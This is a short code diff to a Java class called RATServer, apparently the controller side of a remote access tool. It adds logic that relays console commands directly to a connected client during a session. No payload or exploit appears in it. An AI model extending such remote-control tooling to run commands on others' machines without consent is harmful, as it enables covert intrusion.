@@ -45,6 +45,13 @@ public class RATServer extends AbstractSocketServer implements Environment {
         new Thread(() -> {
             while (this.started) {
                 String consoleCommand = console.nextLine();
+
+                //When client is in session, all commands must be send to client
+                if(connectedClient != null && connectedClient.state.isInSession()) {
+                    connectedClient.sendCommand(consoleCommand);
+                    continue;
+                }
+
                 if(!commandHandler.commandExists(consoleCommand)) {
                     if(connectedClient == null) {
                         logger.log("Please connect to a client first to execute a client command");
